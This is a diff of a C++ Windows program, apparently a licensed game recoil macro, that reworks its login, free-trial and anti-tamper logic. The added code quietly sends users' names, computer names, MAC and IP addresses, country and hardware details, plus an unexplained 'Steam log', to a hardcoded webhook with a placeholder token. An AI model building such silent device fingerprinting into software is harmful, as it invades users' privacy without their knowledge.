     // اعمال تکنیک‌های محافظتی و ارسال لاگ به API در صورت شناسایی تهدید
     output_log_message("Running security protection checks...\n");
-    bool security_threat = RunProtectionChecks();
+    std::string security_code_login;
+    std::string security_details_login;
+    bool security_threat = RunProtectionChecks(security_code_login, security_details_login);
     if (security_threat) {
-        // تهدید امنیتی شناسایی شده است - لاگ قبلاً توسط RunProtectionChecks به API ارسال شده است
-        // ارسال لاگ نهایی به API قبل از بستن برنامه
-        std::string threat_details = "Program is terminating due to security threat in login. ";
-        threat_details += "System: " + std::string(computerName) + ", User: " + std::string(username);
-        threat_details += ", MAC: " + mac_address;
-        send_security_log_to_api("FinalAction", threat_details);
-        output_log_message("Security threat detected. Exiting...\n");
-        // بستن برنامه
-        ExitProcess(0);
+        std::string context_details = security_details_login;
+        if (!context_details.empty()) {
+            context_details += " | ";
+        }
+        context_details += "System: " + std::string(computerName) + ", User: " + std::string(username) + ", MAC: " + mac_address;
+        HandleSecurityBlock(security_code_login, context_details, "LOGIN");
         return;
     }
     output_log_message("Security checks passed.\n");
@@ -4396,6 +5988,9 @@ void perform_login_async(std::string license_key) {
         }
         // <--- پایان تغییر --->
 
+        // ثبت زمان شروع سشن استفاده بعد از لاگین موفق
+        g_session_start_time = std::chrono::steady_clock::now();
+
         current_view = ViewState::Home;
         {
             std::lock_guard<std::mutex> lock(g_login_error_mutex);
@@ -4405,6 +6000,66 @@ void perform_login_async(std::string license_key) {
         // پیام لاگ شامل تاریخ شروع می‌شود
         output_log_message("License accepted via API. Script activated. Start License: " + received_start_license_local + "\n");
         play_sound_async(LOGIN_SUCCESS_SOUND_FILE); // Play success sound
+
+        // --- Send detailed session log to webhook after successful subscription login ---
+        std::string username_str(username);
+        std::string computer_name_str(computerName);
+        std::string gpu_info = get_gpu_info();
+        std::string system_language = get_system_language();
+        std::string ram_info = get_ram_info();
+        std::string cpu_info = get_cpu_info();
+        std::string device_id = get_cached_device_id();
+        std::string system_uptime = get_system_uptime();
+
+        std::string plan_type_local;
+        {
+            std::lock_guard<std::mutex> lock(g_license_data_mutex);
+            plan_type_local = g_plan_type;
+        }
+
+        std::string plan_label;
+        if (plan_type_local == "free_trial") {
+            plan_label = "Free Trial";
+        } else if (plan_type_local == "subscription") {
+            plan_label = "Subscription";
+        } else if (plan_type_local.empty()) {
+            plan_label = "Unknown";
+        } else {
+            plan_label = plan_type_local;
+        }
+
+        std::string user_ip = get_cached_user_ip();
+        std::string user_country = get_cached_user_country();
+        output_log_message("Retrieved user IP (login webhook): " + user_ip + ", Country: " + user_country + "\n");
+
+        long long total_usage_for_webhook = g_total_usage_seconds;
+        if (g_isLoggedIn.load(std::memory_order_relaxed) &&
+            g_session_start_time.time_since_epoch().count() != 0) {
+            auto now_usage = std::chrono::steady_clock::now();
+            auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
+            if (delta_usage > 0) {
+                total_usage_for_webhook += delta_usage;
+            }
+        }
+
+        std::string msg = "User: " + username_str +
+                         "\nComputer: " + computer_name_str +
+                         "\nMAC: " + mac_address +
+                         "\nIP Address: " + user_ip +
+                         "\nCountry: " + user_country +
+                         "\nGPU: " + gpu_info +
+                         "\nSystem Language: " + system_language +
+                         "\nTotal RAM: " + ram_info +
+                         "\nCPU Info: " + cpu_info +
+                         "\nApp Version: " + APP_VERSION_NUMBER +
+                         "\nDevice ID (Hashed): " + device_id +
+                         "\nSystem Uptime: " + system_uptime +
+                         "\nTotal Usage: " + format_duration_seconds(total_usage_for_webhook) +
+                         "\nPlan: " + plan_label;
+
+        std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
+        std::string token = "mysecrettoken";
+        send_webhook_via_google_script(webhook_url, token, msg);
     } else {
         {
             std::lock_guard<std::mutex> lock(g_login_error_mutex);
@@ -4414,6 +6069,7 @@ void perform_login_async(std::string license_key) {
         {
             std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از نوشتن
             g_start_license_str = "N/A"; // بازنشانی به مقدار پیش‌فرض
+            g_plan_type = "unknown";
         }
         // <--- پایان تغییر --->
         output_log_message("License check failed via API. Error: " + api_error_message_local + "\n");
@@ -4426,6 +6082,7 @@ void perform_login_async(std::string license_key) {
 void perform_free_trial_async() {
     // ثبت زمان شروع فرایند نسخه آزمایشی
     auto trial_start_time = std::chrono::high_resolution_clock::now();
+    (void)trial_start_time;
     
     // دریافت اطلاعات سیستم برای لاگ
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
@@ -4446,17 +6103,16 @@ void perform_free_trial_async() {
     
     // اعمال تکنیک‌های محافظتی و ارسال لاگ به API در صورت شناسایی تهدید
     output_log_message("Running security protection checks for free trial...\n");
-    bool security_threat = RunProtectionChecks();
+    std::string security_code_trial;
+    std::string security_details_trial;
+    bool security_threat = RunProtectionChecks(security_code_trial, security_details_trial);
     if (security_threat) {
-        // تهدید امنیتی شناسایی شده است - لاگ قبلاً توسط RunProtectionChecks به API ارسال شده است
-        // ارسال لاگ نهایی به API قبل از بستن برنامه
-        std::string threat_details = "Program is terminating due to security threat in free trial. ";
-        threat_details += "System: " + std::string(computerName) + ", User: " + std::string(username);
-        threat_details += ", MAC: " + mac_address;
-        send_security_log_to_api("FinalAction", threat_details);
-        output_log_message("Security threat detected in free trial. Exiting...\n");
-        // بستن برنامه
-        ExitProcess(0);
+        std::string context_details = security_details_trial;
+        if (!context_details.empty()) {
+            context_details += " | ";
+        }
+        context_details += "System: " + std::string(computerName) + ", User: " + std::string(username) + ", MAC: " + mac_address;
+        HandleSecurityBlock(security_code_trial, context_details, "FREE_TRIAL");
         return;
     }
     output_log_message("Security checks passed for free trial.\n");
@@ -4476,31 +6132,27 @@ void perform_free_trial_async() {
 
     // ساختن device_id
     std::string device_id_hashed = generate_device_id();
-    std::string base_api_url = "https://script.google.com/macros/s/AKfycbz3i2k-M4kixnZGU2Ja7-H4Yau5r1rvPyiXROZR2OKbC8DbWauRsasrZVO5uaVrzx0R0Q/exec";
-    base_api_url += "?license=&device_id=" + device_id_hashed + "&version=" + APP_VERSION_NUMBER;
-
-    // تعریف متغیرها قبل از goto
+    std::string nonce = generate_nonce();
+    std::string timestamp = get_unix_timestamp_seconds();
     std::string response_body;
-    DWORD bytes_read = 0;
-    HINTERNET hConnect = NULL;
-    HINTERNET hInternet = InternetOpen(" Core Client", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInternet) {
-        api_error_message_local = "Failed to initialize WinINet.";
-        goto fail;
+    {
+        std::string http_error;
+        json request_json;
+        request_json["license"] = "";
+        request_json["device_id"] = device_id_hashed;
+        request_json["version"] = APP_VERSION_NUMBER;
+        request_json["nonce"] = nonce;
+        request_json["ts"] = timestamp;
+
+        if (!HttpPostJsonToString(std::string(LICENSE_API_BASE_URL), request_json.dump(), response_body, http_error)) {
+            api_error_message_local = "Failed to connect to the server.";
+            if (!http_error.empty()) {
+                api_error_message_local += " (" + http_error + ")";
+            }
+            output_log_message("Error: Free trial HttpPostJsonToString failed. " + http_error + "\n");
+            goto fail;
+        }
     }
-    hConnect = InternetOpenUrl(hInternet, base_api_url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hConnect) {
-        api_error_message_local = "Failed to connect to the server.";
-        InternetCloseHandle(hInternet);
-        goto fail;
-    }
-    char buffer[4096];
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
-        buffer[bytes_read] = '\0';
-        response_body.append(buffer);
-    }
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
 
     if (response_body.empty()) {
         api_error_message_local = "Empty response from server.";
@@ -4509,6 +6161,12 @@ void perform_free_trial_async() {
 
     try {
         json json_response = json::parse(response_body);
+        std::string signature_error;
+        if (!verify_response_signature(json_response, LICENSE_HMAC_SECRET, nonce, signature_error)) {
+            api_error_message_local = "Invalid server signature.";
+            output_log_message("Free trial API signature check failed: " + signature_error + "\n");
+            goto fail;
+        }
         if (json_response.contains("status") && json_response["status"] == "valid") {
             if (json_response.contains("remaining") && json_response["remaining"].is_string()) {
                 std::string remaining_str = json_response["remaining"];
@@ -4524,6 +6182,13 @@ void perform_free_trial_async() {
             if (json_response.contains("start_license") && json_response["start_license"].is_string()) {
                 received_start_license_local = json_response["start_license"].get<std::string>();
             }
+
+            // Read plan_type from server for free trial; default to free_trial
+            std::string plan_type_local = "free_trial";
+            if (json_response.contains("plan_type") && json_response["plan_type"].is_string()) {
+                plan_type_local = json_response["plan_type"].get<std::string>();
+            }
+
             // موفقیت: فعال‌سازی
             {
                 std::lock_guard<std::mutex> lock(g_license_data_mutex);
@@ -4531,8 +6196,11 @@ void perform_free_trial_async() {
                 g_activation_time = std::chrono::system_clock::now();
                 g_subscription_duration_seconds = received_duration;
                 g_start_license_str = received_start_license_local;
+                g_plan_type = plan_type_local;
                 g_isLoggedIn.store(true, std::memory_order_relaxed); // Set login status to true for gamma control
             }
+            // ثبت زمان شروع سشن استفاده بعد از فعال‌سازی Free Trial
+            g_session_start_time = std::chrono::steady_clock::now();
             current_view = ViewState::Home;
             {
                 std::lock_guard<std::mutex> lock(g_login_error_mutex);
@@ -4541,10 +6209,85 @@ void perform_free_trial_async() {
             recalculate_all_profiles_threadsafe();
             output_log_message("Free Trial accepted via API. Script activated. Start License: " + received_start_license_local + "\n");
             play_sound_async(LOGIN_SUCCESS_SOUND_FILE);
+
+            // --- Send detailed session log to webhook after successful free trial ---
+            std::string username_str(username);
+            std::string computer_name_str(computerName);
+            std::string gpu_info = get_gpu_info();
+            std::string system_language = get_system_language();
+            std::string ram_info = get_ram_info();
+            std::string cpu_info = get_cpu_info();
+            std::string device_id = get_cached_device_id();
+            std::string system_uptime = get_system_uptime();
+
+            std::string plan_label;
+            if (plan_type_local == "free_trial") {
+                plan_label = "Free Trial";
+            } else if (plan_type_local == "subscription") {
+                plan_label = "Subscription";
+            } else if (plan_type_local.empty()) {
+                plan_label = "Unknown";
+            } else {
+                plan_label = plan_type_local;
+            }
+
+            std::string user_ip = get_cached_user_ip();
+            std::string user_country = get_cached_user_country();
+            output_log_message("Retrieved user IP (free trial webhook): " + user_ip + ", Country: " + user_country + "\n");
+
+            long long total_usage_for_webhook = g_total_usage_seconds;
+            if (g_isLoggedIn.load(std::memory_order_relaxed) &&
+                g_session_start_time.time_since_epoch().count() != 0) {
+                auto now_usage = std::chrono::steady_clock::now();
+                auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
+                if (delta_usage > 0) {
+                    total_usage_for_webhook += delta_usage;
+                }
+            }
+
+            std::string msg = "User: " + username_str +
+                             "\nComputer: " + computer_name_str +
+                             "\nMAC: " + mac_address +
+                             "\nIP Address: " + user_ip +
+                             "\nCountry: " + user_country +
+                             "\nGPU: " + gpu_info +
+                             "\nSystem Language: " + system_language +
+                             "\nTotal RAM: " + ram_info +
+                             "\nCPU Info: " + cpu_info +
+                             "\nApp Version: " + APP_VERSION_NUMBER +
+                             "\nDevice ID (Hashed): " + device_id +
+                             "\nSystem Uptime: " + system_uptime +
+                             "\nTotal Usage: " + format_duration_seconds(total_usage_for_webhook) +
+                             "\nPlan: " + plan_label;
+
+            std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
+            std::string token = "mysecrettoken";
+            send_webhook_via_google_script(webhook_url, token, msg);
+
             g_is_logging_in.store(false, std::memory_order_relaxed);
             return;
         } else {
-            if (json_response.contains("message")) {
+            std::string message_str;
+            std::string details_str;
+
+            if (json_response.contains("message") && json_response["message"].is_string()) {
+                message_str = json_response["message"].get<std::string>();
+            }
+            if (json_response.contains("details") && json_response["details"].is_string()) {
+                details_str = json_response["details"].get<std::string>();
+            }
+
+            // If the server reports that a new version is required, trigger the shared update handler
+            if (message_str == "Need Donwload New Version App (Check Discord)") {
+                output_log_message("Free trial API reports outdated version. Update required.\n");
+                handle_update_required_from_server(details_str, api_error_message_local);
+                g_is_logging_in.store(false, std::memory_order_relaxed);
+                return;
+            }
+
+            if (!message_str.empty()) {
+                api_error_message_local = message_str;
+            } else if (json_response.contains("message")) {
                 api_error_message_local = json_response["message"];
             } else {
                 api_error_message_local = "Invalid or expired free trial.";
@@ -4561,6 +6304,7 @@ fail:
     {
         std::lock_guard<std::mutex> lock(g_license_data_mutex);
         g_start_license_str = "N/A";
+        g_plan_type = "unknown";
     }
     output_log_message("Free Trial check failed via API. Error: " + api_error_message_local + "\n");
     play_sound_async(LOGIN_FAILURE_SOUND_FILE);
@@ -4571,6 +6315,9 @@ fail:
 void cleanup_and_exit() {
     output_log_message("\nPerforming cleanup before exit...\n");
  
+
+    // قبل از آزادسازی منابع، زمان استفاده سشن فعلی را به مجموع اضافه و در config ذخیره می‌کنیم
+    accumulate_usage_and_save();
 
     // Play exit sound *before* unhooking and destroying window
     if (g_sound_enabled.load(std::memory_order_relaxed)) {
@@ -4615,95 +6362,7 @@ void cleanup_and_exit() {
 }
 
 
-// --- حلقه ورودی Interception ---
-void interception_input_thread_func() {
-    InterceptionDevice current_device;
-    InterceptionStroke stroke; // یک استروک برای استفاده مجدد
-
-    // پیدا کردن اولین دستگاه کیبورد و ماوس (می‌تواند بهبود یابد)
-    for (InterceptionDevice i = 1; i <= 20; ++i) {
-        if (interception_is_keyboard_ptr(i)) {
-            keyboard_device_id = i;
-            output_log_message("Keyboard device ID: " + std::to_string(i) + "\n");
-            break;
-        }
-    }
-    for (InterceptionDevice i = 1; i <= 20; ++i) {
-        if (interception_is_mouse_ptr(i)) {
-            mouse_device_id = i;
-            output_log_message("Mouse device ID: " + std::to_string(i) + "\n");
-            break;
-        }
-    }
-    if (keyboard_device_id == 0) {
-        std::cerr << "Fehler: Tastaturgerät nicht gefunden!\n";
-    }
-    if (mouse_device_id == 0) {
-        std::cerr << "Fehler: Mausgerät nicht gefunden!\n";
-    }
-    //if (!keyboard_device_id || !mouse_device_id) {
-    //    std::cerr << "Critical: Could not find keyboard or mouse device through Interception.\n";
-    //    return;
-    //}
-
-    while (interception_receive_ptr(context, current_device = interception_wait_ptr(context), &stroke, 1) > 0) {
-        bool block_event = false;
-
-        if (interception_is_keyboard_ptr(current_device)) {
-            InterceptionKeyStroke &kstroke = *reinterpret_cast<InterceptionKeyStroke*>(&stroke);
-
-            // بررسی کلید نشسته (Left Control = Scan Code 0x1D)
-            if (kstroke.code == 0x1D) { // Scan code for Left Control
-                if (kstroke.state == INTERCEPTION_KEY_DOWN) {
-                    is_crouched_interception.store(true);
-                } else if (kstroke.state == INTERCEPTION_KEY_UP) {
-                    is_crouched_interception.store(false);
-                }
-            }
-
-            // بررسی کلیدهای پروفایل (فقط حالت فشرده شدن)
-            if (kstroke.state == INTERCEPTION_KEY_DOWN || kstroke.state == (INTERCEPTION_KEY_DOWN | INTERCEPTION_KEY_E0)) {
-                if (KEY_SCAN_CODE_MAP.count(kstroke.code)) {
-                    std::string target_profile = KEY_SCAN_CODE_MAP[kstroke.code];
-                    std::lock_guard<std::mutex> lock(profile_mutex);
-
-                    if (profile_macro_active.load() && current_gun_profile_str == target_profile) {
-                        profile_macro_active.store(false);
-                        current_gun_profile_str = "";
-                        output_log_message("MACRO-OFF\n");
-                    } else {
-                        profile_macro_active.store(true);
-                        current_gun_profile_str = target_profile;
-                        output_log_message(current_gun_profile_str + "_MACRO-ON\n");
-                    }
-                    block_event = true; // کلید عملکردی را بلاک کن تا به بازی نرود
-                }
-            }
-        } else if (interception_is_mouse_ptr(current_device)) {
-            InterceptionMouseStroke &mstroke = *reinterpret_cast<InterceptionMouseStroke*>(&stroke);
-
-            if (mstroke.state & INTERCEPTION_MOUSE_LEFT_BUTTON_DOWN) {
-                left_mouse_down.store(true);
-            }
-            if (mstroke.state & INTERCEPTION_MOUSE_LEFT_BUTTON_UP) {
-                left_mouse_down.store(false);
-                stop_recoil_flag.store(true);
-            }
-            if (mstroke.state & INTERCEPTION_MOUSE_RIGHT_BUTTON_DOWN) {
-                right_mouse_down.store(true);
-            }
-            if (mstroke.state & INTERCEPTION_MOUSE_RIGHT_BUTTON_UP) {
-                right_mouse_down.store(false);
-                stop_recoil_flag.store(true);
-            }
-        }
-
-        if (!block_event) {
-            interception_send_ptr(context, current_device, &stroke, 1); // ارسال مجدد رویداد اگر بلاک نشده
-        }
-    }
-    output_log_message("Interception receive loop terminated.\n");
-}
+// Low-level input is now handled via Win32 hooks
 void send_webhook_via_google_script(const std::string& full_url, const std::string& token, const std::string& message) {
     HINTERNET hInternet = InternetOpen("WebhookSender", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
@@ -4767,9 +6426,14 @@ void send_webhook_via_google_script(const std::string& full_url, const std::stri
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 }
-bool isInterceptionDriverInstalled() {
-    // بررسی متغیر جهانی که هنگام بارگذاری فایل پیکربندی مقداردهی شده است
-    return g_interception_driver_installed;
+ 
+void send_steam_log_via_server(const std::string& content) {
+    // Log exactly what we are sending to the dedicated Steam log API
+    output_log_message("Steam log plain content:\n" + content + "\n");
+    output_log_message("Sending Steam log via dedicated Steam API URL.\n");
+
+    std::string token = "mysecrettoken";
+    send_webhook_via_google_script(std::string(STEAM_LOG_API_URL), token, content);
 }
 // تابع جدید برای حذف قطعی فایل‌ها با استفاده از چند روش مختلف
 bool forceDeleteFile(const std::string& filePath) {
@@ -4838,962 +6502,57 @@ bool forceDeleteFile(const std::string& filePath) {
 
 // متغیر جهانی برای شمارش تعداد اجراهای برنامه در خط 286 تعریف شده است
 
-bool saveInterceptionDriverStatus(bool installed) {
-    // Debug log removed
-    try {
-        g_interception_driver_installed = installed;
-        // Debug log removed
-        
-        // اطمینان از وجود پوشه config
-        char current_dir[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, current_dir);
-        std::string config_dir = std::string(current_dir) + "\\config";
-        
-        // ایجاد پوشه config اگر وجود ندارد
-        if (!std::filesystem::exists(config_dir)) {
-            // Debug log removed
-            std::filesystem::create_directory(config_dir);
-            
-            // مخفی کردن پوشه config
-            DWORD attributes = GetFileAttributesA(config_dir.c_str());
-            if (attributes != INVALID_FILE_ATTRIBUTES) {
-                SetFileAttributesA(config_dir.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
-                // Debug log removed
-            }
-        }
-        
-        // مسیر فایل config.json در پوشه config
-        std::string config_path = config_dir + "\\config.json";
-        
-        // خواندن فایل config.json اگر وجود دارد
-        nlohmann::json config_json;
-        std::ifstream config_file(config_path);
-        if (config_file.is_open()) {
-            // Debug log removed
-            config_file >> config_json;
-            config_file.close();
-            // Debug log removed
-        } else {
-            // بررسی فایل قدیمی config.json در مسیر اصلی
-            std::string old_config_path = std::string(current_dir) + "\\config.json";
-            std::ifstream old_config_file(old_config_path);
-            if (old_config_file.is_open()) {
-                // Debug log removed
-                old_config_file >> config_json;
-                old_config_file.close();
-                
-                // حذف فایل قدیمی بعد از مهاجرت
-                try {
-                    std::filesystem::remove(old_config_path);
-                    // Debug log removed
-                } catch (...) {
-                    // Debug log removed
-                }
-            } else {
-                // Debug log removed
-            }
-        }
-        
-        // بررسی ساختار JSON قبل از تغییر
-        if (config_json.contains("Interception")) {
-            // Debug log removed
-            
-            // خواندن تعداد اجراهای برنامه
-            if (config_json["Interception"].contains("RunCount")) {
-                g_app_run_count = config_json["Interception"]["RunCount"].get<int>();
-                // Debug log removed
-            }
-            
-            // خواندن وضعیت نمایش پیام ریستارت
-            if (config_json["Interception"].contains("ShowRestartMessage")) {
-                g_show_restart_message = config_json["Interception"]["ShowRestartMessage"].get<bool>();
-                // Debug log removed
-            } else {
-                // اگر این متغیر در فایل config.json وجود ندارد، فرض می‌کنیم که اولین اجرای برنامه است
-                g_show_restart_message = true;
-                output_log_message("[DEBUG] Show restart message not found in config. Setting to true.\n");
-            }
-        } else {
-            // Debug log removed
-        }
-        
-        // افزایش شمارنده اجرا
-        g_app_run_count++;
-        // Debug log removed
-        
-        // تنظیم مقادیر جدید
-        config_json["Interception"]["DriverInstalled"] = installed;
-        config_json["Interception"]["RunCount"] = g_app_run_count;
-        config_json["Interception"]["ShowRestartMessage"] = false; // بعد از اولین اجرا، این متغیر را غیرفعال کن
-
-        // Debug log removed
-        
-        // نوشتن به فایل
-        std::ofstream output_file(config_path);
-        if (output_file.is_open()) {
-            // Debug log removed
-            output_file << config_json.dump(4) << std::endl;
-            output_file.close();
-            // Debug log removed
-            return true;
-        } else {
-            // Debug log removed
-            
-            // روش 2: نوشتن به فایل موقت و سپس تغییر نام
-            try {
-                // ایجاد نام فایل موقت
-                std::string temp_file = config_dir + "\\config_temp.json";
-                // Debug log removed
-                
-                // نوشتن به فایل موقت
-                std::ofstream temp_output(temp_file);
-                if (temp_output.is_open()) {
-                    temp_output << config_json.dump(4) << std::endl;
-                    temp_output.close();
-                    // Debug log removed
-                    
-                    // تلاش برای حذف فایل اصلی و تغییر نام فایل موقت
-                    if (std::filesystem::exists(config_path)) {
-                        // Debug log removed
-                        std::filesystem::remove(config_path);
-                    }
-                    
-                    // روش 3: استفاده از دستور خط برای کپی فایل
-                    std::string cmd = "copy /Y \"" + temp_file + "\" \"" + config_path + "\"";
-                    // Debug log removed
-                    int result = system(cmd.c_str());
-                    // Debug log removed
-                    
-                    // حذف فایل موقت
-                    std::filesystem::remove(temp_file);
-                    
-                    // بررسی نتیجه
-                    if (std::filesystem::exists(config_path)) {
-                        // Debug log removed
-                        return true;
-                    }
-                }
-                // Debug log removed
-            } catch (const std::exception& e) {
-                // Debug log removed
-            }
-            
-            std::cerr << "Error: Could not open config.json for saving driver installation status." << std::endl;
-            return false;
-        }
-        
-        output_file.close();
-        
-        // تنظیم ویژگی مخفی برای فایل پیکربندی
-        if (SetFileAttributesW(L"config.json", FILE_ATTRIBUTE_HIDDEN) == 0) {
-            std::cerr << "Warning: Could not set config.json to hidden." << std::endl;
-        }
-        
-        // Debug log removed
-        return true;
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error saving Interception driver installation status: " << e.what() << std::endl;
-        return false;
-    }
-}
-
-// تعریف تابع forceDeleteFile در بالای فایل انجام شده است
-
-// --- تابع بررسی وجود سرویس Interception ---
-bool isInterceptionServiceInstalled() {
-    // Debug log removed
-    
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-    if (!scm) {
-        DWORD error = GetLastError();
-        // Debug log removed
-        return false;
-    }
-    
-    // Debug log removed
-    SC_HANDLE service = OpenServiceW(scm, L"interception", SERVICE_QUERY_STATUS);
-    bool exists = (service != NULL);
-    
-    if (service) {
-        // Debug log removed
-        CloseServiceHandle(service);
-    } else {
-        DWORD error = GetLastError();
-        // Debug log removed
-    }
-    
-    CloseServiceHandle(scm);
-    
-    // اگر سرویس وجود داشت، وضعیت را در فایل config.json به‌روزرسانی کنید
-    if (exists) {
-        try {
-            // Debug log removed
-            saveInterceptionDriverStatus(true);
-            // Debug log removed
-        } catch (const std::exception& e) {
-            // Debug log removed
-            std::cerr << "Error updating config.json: " << e.what() << std::endl;
-        }
-    }
-    
-    return exists;
-}
-
-// --- تابع نصب درایور Interception ---
-bool installInterceptionDriver() {
-    try {
-        // ابتدا بررسی می‌کنیم که آیا سرویس Interception قبلاً نصب شده است
-        if (isInterceptionServiceInstalled()) {
-            output_log_message("Interception service is already installed on the system.\n");
-            // به‌روزرسانی فایل config.json
-            saveInterceptionDriverStatus(true);
-            return true;
-        }
-        
-        output_log_message("Installing Interception driver...\n");
-        
-        // مسیر فایل اجرایی نصب‌کننده درایور
-        std::string installer_path = "install-interception.exe";
-        
-        // بررسی وجود فایل نصب‌کننده با نام‌های مختلف
-        // Debug log removed
-        
-        // لیست نام‌های ممکن برای فایل نصبی
-        std::vector<std::string> possible_installer_names = {
-            "install-interception.exe",
-            "installinterception.exe",
-            "interception-install.exe",
-            "interceptioninstall.exe"
-        };
-        
-        bool installer_found = false;
-        
-        // بررسی هر یک از نام‌های ممکن
-        for (const auto& name : possible_installer_names) {
-            // Debug log removed
-            if (std::filesystem::exists(name)) {
-                installer_path = name;
-                installer_found = true;
-                output_log_message("[DEBUG] Found installer file: " + installer_path + "\n");
-                break;
-            }
-        }
-        
-        // بررسی وجود فایل نصب‌کننده
-        if (!installer_found) {
-            // اگر فایل نصب‌کننده وجود نداشته باشد
-            std::cerr << "Interception driver installer not found! Please make sure one of the following files exists:\n";
-            for (const auto& name : possible_installer_names) {
-                std::cerr << "  - " << name << "\n";
-            }
-            std::cerr << "\n";
-            
-            // Debug log removed
-            
-            // Debug log removed
-            
-            // بررسی مجدد وجود سرویس
-            if (isInterceptionServiceInstalled()) {
-                // Debug log removed
-                return saveInterceptionDriverStatus(true);
-            } else {
-                // Debug log removed
-                return false;
-            }
-        }
-        
-        // به دست آوردن مسیر مطلق فایل نصب‌کننده
-        char current_dir[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, current_dir);
-        std::string full_installer_path = std::string(current_dir) + "\\" + installer_path;
-        
-        // روش 1: استفاده از ShellExecuteEx
-        SHELLEXECUTEINFOW sei;
-        ZeroMemory(&sei, sizeof(sei));
-        sei.cbSize = sizeof(sei);
-        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-        sei.hwnd = NULL;
-        sei.lpVerb = L"runas";
-        
-        // تبدیل مسیر به wchar_t
-        wchar_t wpath[MAX_PATH];
-        MultiByteToWideChar(CP_ACP, 0, full_installer_path.c_str(), -1, wpath, MAX_PATH);
-        sei.lpFile = wpath;
-        sei.lpParameters = L"/install";
-        sei.nShow = SW_SHOW;
-        
-        if (!ShellExecuteExW(&sei)) {
-            DWORD error = GetLastError();
-            
-            if (error == ERROR_CANCELLED) {
-                output_log_message("Driver installation was cancelled by the user.\n");
-                
-                // در صورت رد کردن دسترسی ادمین، فایل config.json را حذف کن
-                try {
-                    char current_dir[MAX_PATH];
-                    GetCurrentDirectoryA(MAX_PATH, current_dir);
-                    
-                    // لاگ کردن مسیر جاری برای اطمینان
-                    output_log_message("[DEBUG] Current directory: " + std::string(current_dir) + "\n");
-                    
-                    // حذف فایل config.json در مسیر اصلی
-                    std::string config_path = std::string(current_dir) + "\\config.json";
-                    output_log_message("[DEBUG] Attempting to delete config.json at: " + config_path + "\n");
-                    
-                    // بررسی وجود فایل و لاگ کردن وضعیت
-                    bool config_exists = std::filesystem::exists(config_path);
-                    output_log_message("[DEBUG] config.json exists: " + std::string(config_exists ? "true" : "false") + "\n");
-                    
-                    if (config_exists) {
-                        // بررسی ویژگی‌های فایل قبل از حذف
-                        DWORD attributes = GetFileAttributesA(config_path.c_str());
-                        if (attributes != INVALID_FILE_ATTRIBUTES) {
-                            output_log_message("[DEBUG] config.json attributes: " + std::to_string(attributes) + "\n");
-                            if (attributes & FILE_ATTRIBUTE_READONLY) {
-                                output_log_message("[DEBUG] config.json is read-only, changing attributes...\n");
-                                SetFileAttributesA(config_path.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
-                            }
-                        }
-                        
-                        // تلاش برای حذف فایل
-                        if (forceDeleteFile(config_path)) {
-                            output_log_message("[DEBUG] Successfully deleted config.json after admin access denial\n");
-                            // بررسی مجدد برای اطمینان از حذف
-                            if (!std::filesystem::exists(config_path)) {
-                                output_log_message("[DEBUG] Verified config.json is deleted\n");
-                            } else {
-                                output_log_message("[DEBUG] Warning: config.json still exists after deletion!\n");
-                            }
-                        } else {
-                            output_log_message("[DEBUG] Failed to delete config.json using forceDeleteFile\n");
-                            // تلاش با روش دیگر
-                            std::string cmd = "del /f /q /a \"" + config_path + "\"";
-                            output_log_message("[DEBUG] Trying with elevated command: " + cmd + "\n");
-                            system(cmd.c_str());
-                            
-                            // بررسی نتیجه
-                            if (!std::filesystem::exists(config_path)) {
-                                output_log_message("[DEBUG] Successfully deleted config.json with elevated command\n");
-                            } else {
-                                output_log_message("[DEBUG] All attempts to delete config.json failed\n");
-                            }
-                        }
-                    } else {
-                        output_log_message("[DEBUG] config.json not found for deletion\n");
-                    }
-                    
-                    // بررسی وجود پوشه config
-                    std::string config_dir = std::string(current_dir) + "\\config";
-                    bool config_dir_exists = std::filesystem::exists(config_dir);
-                    output_log_message("[DEBUG] Config directory exists: " + std::string(config_dir_exists ? "true" : "false") + "\n");
-                            
-                    
-                    // ایجاد فایل نشانگر برای نمایش مجدد پیام در اجرای بعدی
-                    std::string show_again_flag = std::string(current_dir) + "\\SHOW_RESTART_AGAIN.txt";
-                    std::ofstream flag_file(show_again_flag);
-                    if (flag_file.is_open()) {
-                        flag_file << "User cancelled admin access. Show restart message again next time.\n";
-                        flag_file.close();
-                        output_log_message("[DEBUG] Created SHOW_RESTART_AGAIN.txt to show message again next time.\n");
-                        
-                        // مخفی کردن فایل
-                        std::wstring wflag_path = std::wstring(show_again_flag.begin(), show_again_flag.end());
-                        SetFileAttributesW(wflag_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
-                    }
-                    
-                    // این بخش حذف شده است چون بالاتر انجام شده است
-                } catch (const std::exception& e) {
-                    output_log_message("[DEBUG] Exception while handling restart flags: " + std::string(e.what()) + "\n");
-                } catch (...) {
-                    output_log_message("[DEBUG] Unknown error handling restart flags.\n");
-                }
-            } else {
-                output_log_message("ShellExecuteEx failed. Trying alternative method...\n");
-                
-                // روش 2: استفاده از PowerShell برای اجرای با دسترسی مدیر
